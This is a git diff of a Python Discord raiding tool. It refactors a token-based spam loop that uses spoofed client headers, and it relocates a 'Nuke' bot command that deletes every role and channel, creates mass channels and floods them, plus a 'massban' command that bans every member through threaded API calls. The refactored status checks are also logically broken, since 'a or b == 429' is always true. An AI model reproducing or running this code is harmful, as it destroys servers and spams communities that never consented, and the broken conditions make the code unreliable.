@@ -178,8 +178,8 @@ def spammer():
             for member4 in members4:
                 mess3 += "".join(f'{member4}')
             members5 = open('staff/users.txt').readlines()[200:250]
-            for member2 in members5:
-                mess4 += "".join(f'{member2}')
+            for member5 in members5:
+                mess4 += "".join(f'{member5}')
             members6 = open('staff/users.txt').readlines()[300:350]
             for member6 in members6:
                 mess6 += "".join(f'{member6}')
@@ -206,127 +206,7 @@ def spammer():
                 payload4 = {"content": mess8, "tts": False}
                 payload5 = {"content": mess9, "tts": False}
 
-                headerr = {"authorization": token,
-                           "accept": "*/*",
-                           "accept-language": "en-GB",
-                           "content-length": "90",
-                           "content-type": "application/json",
-                           "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                           "origin": "https://discord.com",
-                           "sec-fetch-dest": "empty",
-                           "sec-fetch-mode": "cors",
-                           "sec-fetch-site": "same-origin",
-                           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                           "x-debug-options": "bugReporterEnabled",
-                           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                           }
-                headerrr = {"authorization": token,
-                            "accept": "*/*",
-                            "accept-language": "en-GB",
-                            "content-length": "90",
-                            "content-type": "application/json",
-                            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                            "origin": "https://discord.com",
-                            "sec-fetch-dest": "empty",
-                            "sec-fetch-mode": "cors",
-                            "sec-fetch-site": "same-origin",
-                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                            "x-debug-options": "bugReporterEnabled",
-                            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                            }
-                headerrrr = {"authorization": token,
-                             "accept": "*/*",
-                             "accept-language": "en-GB",
-                             "content-length": "90",
-                             "content-type": "application/json",
-                             "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                             "origin": "https://discord.com",
-                             "sec-fetch-dest": "empty",
-                             "sec-fetch-mode": "cors",
-                             "sec-fetch-site": "same-origin",
-                             "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                             "x-debug-options": "bugReporterEnabled",
-                             "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                             }
-                headerrrrr = {"authorization": token,
-                              "accept": "*/*",
-                              "accept-language": "en-GB",
-                              "content-length": "90",
-                              "content-type": "application/json",
-                              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                              "origin": "https://discord.com",
-                              "sec-fetch-dest": "empty",
-                              "sec-fetch-mode": "cors",
-                              "sec-fetch-site": "same-origin",
-                              "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                              "x-debug-options": "bugReporterEnabled",
-                              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                              }
-                header1 = {"authorization": token,
-                           "accept": "*/*",
-                           "accept-language": "en-GB",
-                           "content-length": "90",
-                           "content-type": "application/json",
-                           "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                           "origin": "https://discord.com",
-                           "sec-fetch-dest": "empty",
-                           "sec-fetch-mode": "cors",
-                           "sec-fetch-site": "same-origin",
-                           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                           "x-debug-options": "bugReporterEnabled",
-                           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                           }
-                header2 = {"authorization": token,
-                           "accept": "*/*",
-                           "accept-language": "en-GB",
-                           "content-length": "90",
-                           "content-type": "application/json",
-                           "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                           "origin": "https://discord.com",
-                           "sec-fetch-dest": "empty",
-                           "sec-fetch-mode": "cors",
-                           "sec-fetch-site": "same-origin",
-                           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                           "x-debug-options": "bugReporterEnabled",
-                           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                           }
-                header3 = {"authorization": token,
-                           "accept": "*/*",
-                           "accept-language": "en-GB",
-                           "content-length": "90",
-                           "content-type": "application/json",
-                           "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                           "origin": "https://discord.com",
-                           "sec-fetch-dest": "empty",
-                           "sec-fetch-mode": "cors",
-                           "sec-fetch-site": "same-origin",
-                           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                           "x-debug-options": "bugReporterEnabled",
-                           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                           }
-                header4 = {"authorization": token,
-                           "accept": "*/*",
-                           "accept-language": "en-GB",
-                           "content-length": "90",
-                           "content-type": "application/json",
-                           "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
-                           "origin": "https://discord.com",
-                           "sec-fetch-dest": "empty",
-                           "sec-fetch-mode": "cors",
-                           "sec-fetch-site": "same-origin",
-                           "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
-                           "x-debug-options": "bugReporterEnabled",
-                           "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
-
-                           }
-                header5 = {"authorization": token,
+                header = {"authorization": token,
                            "accept": "*/*",
                            "accept-language": "en-GB",
                            "content-length": "90",
@@ -344,159 +224,36 @@ def spammer():
 
                 while True:
                     time.sleep(delay)
-                    src2 = requests.post(url, headers=headerr, json=payloadd)
-                    src3 = requests.post(url, headers=headerrr, json=payloaddd)
-                    src4 = requests.post(url, headers=headerrrr, json=payloadddd)
-                    src5 = requests.post(url, headers=headerrrrr, json=payloaddddd)
-                    src7 = requests.post(url, headers=header1, json=payload1)
-                    src8 = requests.post(url, headers=header2, json=payload2)
-                    src9 = requests.post(url, headers=header3, json=payload3)
-                    src10 = requests.post(url, headers=header4, json=payload4)
-                    src11 = requests.post(url, headers=header5, json=payload5)
+                    src2 = requests.post(url, headers=header, json=payloadd)
+                    src3 = requests.post(url, headers=header, json=payloaddd)
+                    src4 = requests.post(url, headers=header, json=payloadddd)
+                    src5 = requests.post(url, headers=header, json=payloaddddd)
+                    src7 = requests.post(url, headers=header, json=payload1)
+                    src8 = requests.post(url, headers=header, json=payload2)
+                    src9 = requests.post(url, headers=header, json=payload3)
+                    src10 = requests.post(url, headers=header, json=payload4)
+                    src11 = requests.post(url, headers=header, json=payload5)
 
-                    if src2.status_code == 429:
-                        ratelimit = json.loads(src2.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
+                    if src2.status_code or src3.status_code or src4.status_code or src5.status_code or src7.status_code or src9.status_code or src8.status_code or src10.status_code or src11.status_code == 429:
+                        ratelimit = json.loads(src2.content or src3.content or src4.content or src5.content or src7.content or src8.content or src9.content or src10.content or src11.content)
 
-                    elif src2.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
+                        try:
+                            print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
+                                  str(float(ratelimit['retry_after'])) + " seconds")
+                            time.sleep(float(ratelimit['retry_after']))
+                        except:
+                            pass
 
-                    elif src2.status_code == 401:
+                    elif src2.status_code or src3.status_code or src4.status_code or src5.status_code or src7.status_code or src9.status_code or src8.status_code or src10.status_code or src11.status_code  == 200:
+                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess1 or mess2 or mess3 or mess4 or mess5 or mess6 or mess7 or mess8 or mess9} sent')
+
+                    elif src2.status_code or src3.status_code or src4.status_code or src5.status_code or src7.status_code or src9.status_code or src8.status_code or src10.status_code or src11.status_code  == 401:
                         print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src2.status_code == 404:
+                    elif src2.status_code or src3.status_code or src4.status_code or src5.status_code or src7.status_code or src9.status_code or src8.status_code or src10.status_code or src11.status_code  == 404:
                         print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src2.status_code == 403:
+                    elif src2.status_code or src3.status_code or src4.status_code or src5.status_code or src7.status_code or src9.status_code or src8.status_code or src10.status_code or src11.status_code  == 403:
                         print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
 
-                    if src3.status_code == 429:
-                        ratelimit = json.loads(src3.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src3.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src3.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src3.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src3.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src4.status_code == 429:
-                        ratelimit = json.loads(src4.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src4.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src4.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src4.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src4.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src5.status_code == 429:
-                        ratelimit = json.loads(src5.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src5.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src5.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src5.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src5.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src7.status_code == 429:
-                        ratelimit = json.loads(src7.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src7.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src7.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src7.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src7.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src8.status_code == 429:
-                        ratelimit = json.loads(src8.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src8.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src8.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src8.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src8.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src9.status_code == 429:
-                        ratelimit = json.loads(src9.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src9.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src9.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src9.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src9.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src10.status_code == 429:
-                        ratelimit = json.loads(src10.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src10.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src10.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src10.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src10.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
-
-                    if src11.status_code == 429:
-                        ratelimit = json.loads(src11.content)
-                        print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for",
-                              str(float(ratelimit['retry_after'])) + " seconds")
-                        time.sleep(float(ratelimit['retry_after']))
-
-                    elif src11.status_code == 200:
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')
-
-                    elif src11.status_code == 401:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
-                    elif src11.status_code == 404:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
-                    elif src11.status_code == 403:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')
 
             def thread1():
                 text1 = mess1
@@ -1624,98 +1381,91 @@ def spammer():
                 chanless = input('Channels names: ')
                 spam = input('Message you wanna spam: ')
                 print(f'{Fore.LIGHTMAGENTA_EX}For nuke write to chat: !Nuke{Fore.RESET}')
+                client = commands.Bot(command_prefix="!")
+
+                @client.command()
+                async def Nuke(ctx):
+                    await ctx.message.delete()
+                    guild = ctx.guild
+
+                    for role in guild.roles:
+                        try:
+                            await role.delete()
+                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
+                        except:
+                            print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')
+
+                    for channel in guild.channels:
+                        try:
+                            await channel.delete()
+                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
+                        except:
+                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')
+
+                    try:
+                        for i in range(MAX_CHANNELS):
+                            await guild.create_text_channel(chanless)
+                            print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
+                    except:
+                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')
+
+                @client.event
+                async def on_guild_channel_create(channel):
+                    while True:
+                        try:
+                            await channel.send(spam)
+                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')
+
+                        except:
+                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')
+
+                def thread():
+                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
+
+                thread()
+
+                def thread2():
+                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()
+
+                thread2()
 
 
             if choicee == 2:
                 print(f'{Fore.LIGHTMAGENTA_EX}For for banning write to chat: !massban{Fore.RESET}')
+                headers = {
+                    "Authorization":
+                        f"Bot {TOKEN}"
+                }
+
+                client2 = commands.Bot(
+                    command_prefix='!',
+                    intents=discord.Intents.all(),
+                    help_command=None
+                )
+
+                @client2.command()
+                async def massban(ctx):
+                    await ctx.message.delete()
+                    servr = ctx.guild.id
+
+                    def mass_ban(i):
+                        sessions = requests.Session()
+                        sessions.put(
+                            f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
+                            headers=headers
+                        )
+
+                    for i in range(3):
+                        for member in list(ctx.guild.members):
+                            threading.Thread(
+                                target=mass_ban,
+                                args=(member.id,)
+                            ).start()
+                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done...')
 
 
-            client = commands.Bot(command_prefix="!")
+                client2.run(TOKEN)
 
-            headers = {
-                "Authorization":
-                    f"Bot {TOKEN}"
-            }
-
-            client2 = commands.Bot(
-                command_prefix='!',
-                intents=discord.Intents.all(),
-                help_command=None
-            )
-
-            @client2.command()
-            async def massban(ctx):
-                await ctx.message.delete()
-                servr = ctx.guild.id
-
-                def mass_ban(i):
-                    sessions = requests.Session()
-                    sessions.put(
-                        f"https://discord.com/api/v9/guilds/{servr}/bans/{i}",
-                        headers=headers
-                    )
-
-                for i in range(3):
-                    for member in list(ctx.guild.members):
-                        threading.Thread(
-                            target=mass_ban,
-                            args=(member.id,)
-                        ).start()
-                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done...')
-
-
-            client2.run(TOKEN)
-
-            @client.command()
-            async def Nuke(ctx):
-                await ctx.message.delete()
-                guild = ctx.guild
-
-
-                for role in guild.roles:
-                    try:
-                        await role.delete()
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{role.name} Has been deleted{Fore.RESET}')
-                    except:
-                        print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{role.name} Has not been deleted')
-
-
-                for channel in guild.channels:
-                    try:
-                        await channel.delete()
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{channel.name} Has been deleted')
-                    except:
-                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant delete {channel}')
-
-
-                try:
-                    for i in range(MAX_CHANNELS):
-                        await guild.create_text_channel(chanless)
-                        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{chanless} has been created')
-                except:
-                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You havent got permission to create channels')
-
-
-
-            @client.event
-            async def on_guild_channel_create(channel):
-                while True:
-                    try:
-                        await channel.send(spam)
-                        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} SPAMMIMG :)')
-
-                    except:
-                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant spam')
-
-
-            def thread():
-                    threading.Thread(target=on_guild_channel_create, args=(client.run(TOKEN))).start()
-            thread()
-
-            def thread2():
-                    threading.Thread(target=Nuke, args=(client.run(TOKEN))).start()
-
-            thread2()
 
 
 
